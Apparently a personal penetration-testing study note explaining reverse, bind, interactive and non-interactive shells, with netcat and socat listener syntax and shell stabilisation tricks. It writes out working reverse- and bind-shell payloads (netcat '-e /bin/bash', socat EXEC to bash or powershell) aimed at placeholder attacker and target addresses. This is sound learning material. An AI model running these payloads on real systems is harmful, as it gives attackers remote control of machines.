# Shells
## Reverse Shells
Reverse shells are when the target is forced to execute code that connects back to our computer. On our own computer we would set up a listener which would be used to receive the connection. They are a good way to bypass firewall rules that may prevent us from connecting to arbitrary posts on the target, however, when receiving a shell from a machine across the internet, we would need to configure our own network to accept the shell. 

## Bind Shells
Bind shells are when the code executed on the target is used to start a listener attached to a shell directly on the target. This would then be opened up to the internet meaning we can connect to the port that the code has opened and obtain RCE. This has the advantage of not requiring any configuration on our own network, but may be prevented by firewalls protecting the target.

## Interactive
These type of shells allow us to interact with programs after executing them, an example of this is the prompt that [[SSH]] gives us after entering the command, with interactive shells we will receive the prompt and are allowed to interact with it as if it were a normal CLI environment.

## Non-Interactive
Contrary to interactive shells, these shells do not allow programs that require user interaction in order to run, when running commands like [[SSH]], nano, etc. the prompt will no appear in our shell, but commands like cat or whoami work fine.

# Tools
## Netcat
[[Netcat]] is the most basic tool when it comes to any kind of networking. 

### Reverse
To set up a reverse shell we can start by creating a listener in our machine with the following syntax
```sh
nc -nlvp PORT
```
this will make it so netcat does not resolves hosts names or uses DNS, is a listener, uses verbose and sets it to a specified port.
We then can connect to this with any number of payloads depending on the environment on the target, like (for linux)
```
nc ATTACK_IP PORT -e /bin/bash
```
For us to gain RCE

### Bind
To use a Bind shell we need to first establish a listener on the target waiting for us to connect to it, depending on the environment this can also be accomplished with netcat with a basic listener and adding either `-e "cmd.exe"`
for windows or `-e /bin/bash` for linux. 
Then we can connect to it with
```sh
nc TARGET PORT
```

### Stabilisation
These shells are very unstable by default, they are non-interactive and often have strange formatting errors, this is due to netcat 'shells' really being processes running inside a terminal, rather than being genuine terminals.
#### Python
1. The first thing to do is use `python -c 'import pty;pty.spawn("/bin/bash")'`, which uses Python to spawn a better featured bash shell; note that some targets may need the version of Python specified. If this is the case, replace `python` with `python2` or `python3` as required. At this point our shell will look a bit prettier, but we still won't be able to use tab autocomplete or the arrow keys, and Ctrl + C will still kill the shell.
2. Step two is: `export TERM=xterm` -- this will give us access to term commands such as `clear`.
3. Finally (and most importantly) we will background the shell using Ctrl + Z. Back in our own terminal we use `stty raw -echo; fg`. This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes, `reset` when we finish to return to normal). It then foregrounds the shell, thus completing the process.
#### rlwrap
rlwrap is a program which, in simple terms, gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell; however, some manual stabilisation must still be utilised if you want to be able to use Ctrl + C inside the shell. rlwrap is not installed by default on Kali, so first install it with `sudo apt install rlwrap`.

To use rlwrap, we invoke a slightly different listener:

`rlwrap nc -lvnp <port>`  

Prepending our netcat listener with "rlwrap" gives us a much more fully featured shell. This technique is particularly useful when dealing with Windows shells, which are otherwise notoriously difficult to stabilise. When dealing with a Linux target, it's possible to completely stabilise, by using the same trick as in step three of the previous technique: background the shell with Ctrl + Z, then use `stty raw -echo; fg` to stabilise and re-enter the shell.



## Socat
Similar to [[Netcat]] in some ways, [[Socat]] is a connector between two points, as it provides a link between two points, whether they be  a listening port and a keyboard, a listening port and a file or two listening ports
### Reverse
The syntax for [[Socat]] gets more complicated than that of Netcat, for a reverse shell listener, the syntax is the following 
```sh
socat TCP-L:<port> -
``` 
 
This is taking two points (a listening port and standard input) and connecting them together. The resulting shell is unstable. (this is the equivalent to `nc -lnvp <port>`).

Then we can connect to the listener in the target machine with the following for a linux target

```sh
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
```
Or the following on a windows target
```sh
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
```
The "pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output.


### Bind
On a linux target we set up the listener as the following
```sh
socat TCP-L:<PORT> EXEC:"bash -li"
```
While on windows
```sh
socat TCP-L:<PORT> EXEC:powershell.exe,pipes
```

Regardless of the target we use the following on our attacking machine to connect to the listener
```sh
socat TCP:<TARGET-IP>:<TARGET-PORT> -
```

### Stabilisation
One of the advantages of socat is its versatility, one of the ways in which we can use this is to significantly stabilise the reverse shell. In the case of a linux target we can use
```sh
socat TCP-L:<port> FILE:`tty`,raw,echo=0
```
Which would, as usual connect two points together through TCP, in this case these two points are a listening port and a file, specifically, we are passing the current TTY as a file and setting the echo to be zero. This is the equivalent to using the Ctrl+Z `stty raw -echo; fg` trick with a netcat shell, with the benefit of being immediately stable and hooking into a full tty.

The normal listener can be connected to with any payload, however, this special listener must be activated with a very specific socat command, meaning the target must also have socat installed. As not all targets are gonna have it, we can upload a [precompiled socat binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true), which can then be executed as normal.
The command is as follows
```sh
socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```
First we are linking with the listener running on our own machine. Then it creates an interactive bash session with `EXEC:"bash -li"` and then we pass the following arguments
* pty: allocates a pseudoterminal on the target 
* stderr: makes sure that any error messages get shown in the shell
* sigint: passes any Ctrl+C commands through into the sub-process, allowing us to kill commands inside the shell
* setsid: creates the process in a new session
* sane: stabilises the terminal, attempting to "normalise" it

###

## msfvenom


## Metasploit


